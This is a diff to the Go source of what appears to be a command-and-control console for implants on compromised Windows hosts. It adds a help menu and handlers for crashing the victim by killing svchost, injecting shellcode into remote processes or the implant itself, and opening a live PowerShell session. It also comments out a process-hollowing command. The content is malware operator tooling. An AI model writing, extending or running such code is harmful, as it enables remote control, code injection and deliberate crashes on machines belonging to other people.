@@ -204,10 +204,8 @@ func openSession(id int, ll *SessionList) {
 				if err != nil {
 					fmt.Println("[-]Error reading input:", err)
 					continue
-				} //Check how to make this prettier
+				}
 				command = strings.TrimSpace(command) //This removes leading and trailing whitespaces. It is very important. If something should work but isn't, this could be the reason
-				//playRegex := regexp.MustCompile(`play .+`)
-				//playMatch := playRegex.FindString(command)
 				loadRegex := regexp.MustCompile(`load .+`)
 				loadMatch := loadRegex.FindString(command)
 				cdRegex := regexp.MustCompile(`cd .+`)
@@ -239,7 +237,7 @@ func openSession(id int, ll *SessionList) {
 					if bsod(&current.Conn) {
 						fmt.Println()
 						fmt.Println("[!]HOST BSOD !")
-						fmt.Println("[?]Impliment Feature where the session is removed from the list when this happens")
+						ll.closeSession(current.id)
 						fmt.Println()
 						return
 					} else {
@@ -251,11 +249,6 @@ func openSession(id int, ll *SessionList) {
 					return
 				case "exit":
 					return
-				// case "play": //The audio thing only works if the device is not a VM
-				// 	fmt.Println()
-				// 	fmt.Println("[?]Usage: play <fileNameInAudio>")
-				// 	fmt.Println()
-				//playAudio(&current.Conn, "BombPlanted.mp3") //Test Case. Plays but not fully.
 				case "load": //Works nicely but only with x64 payloads so be careful !!! //TO-DO add a prompt to exit if shit gets real
 					fmt.Println("\n[?]Usage: load <pathTox64Shellcode>\n")
 				case "inject":
@@ -264,14 +257,30 @@ func openSession(id int, ll *SessionList) {
 					fmt.Println("\n[?]Usage: cd <dir>\n") //Works with relative and absolute paths
 				case "ls":
 					ls(&current.Conn)
+				case "dir":
+					ls(&current.Conn)
 				case "pwd":
 					pwd(&current.Conn)
-				case "threadless":
-					fmt.Println("\n[?]Usage: threadless <pathToShellcodeLocal> <RemoteProcessName>\n")
-				case "hollow":
-					fmt.Println("\n[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
-					fmt.Println("[?]Windows paths must have double backslashes as such: \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"\n")
+				// case "hollow":
+				// 	fmt.Println("\n[?]Usage: hollow <pathToExeLocal> <\"path2ExeRemote\">")
+				// 	fmt.Println("[?]Windows paths must have double backslashes as such: \"C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\"\n")
+				case "help":
+					fmt.Println()
+					fmt.Println("[!]Below is a list of useful commands:\n[+]bg: will background the current session")
+					fmt.Println("   bsod: will crash the current host by attempting to kill svchost (Admin+)")
+					fmt.Println("   cd: Changes the local directory to the specified one eg cd ../Pictures")
+					fmt.Println("   dir: Alias for ls")
+					fmt.Println("   exit: Alias for bg")
+					fmt.Println("   hostinfo: Displays information pertaining to the current house")
+					fmt.Println("   inject: Will attempt to write and execute shellcode into a remote process")
+					fmt.Println("   load: Will attempt to write and execute shellcode into the shell's process")
+					fmt.Println("   ls: Lists the contents of current directory. Will upgrade in future to be able to do remote ones too")
+					fmt.Println("   pwd: Prints the path to the implant")
+					fmt.Println("   shell: Drops down into a live powershell session")
+					fmt.Println()
+
 				default:
+					fmt.Println("\n[!]Invalid input\n")
 				}
 			}
 		}
